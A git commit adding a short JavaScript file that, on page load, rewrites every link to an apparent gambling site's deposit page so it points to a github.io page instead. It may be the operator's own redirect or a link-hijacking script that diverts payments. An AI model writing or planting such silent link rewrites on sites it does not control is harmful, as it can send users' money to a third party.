0608e902f4d67bd6c71ea4f40c30a45fd93d517a
inggarfi <inggarsaput@gmail.com>
2025-10-12 18:09:29 +0700

    Create dls.js

---
+++ dls.js
@@ -0,0 +1,6 @@
+document.addEventListener("DOMContentLoaded", function () {
+  // Ganti semua link dengan href tertentu
+  document.querySelectorAll('a[href="https://istanajp03.my/m/account/deposit"]').forEach(link => {
+    link.href = "https://inggarfi.github.io/depoyukbos/kzka";
+  });
+});
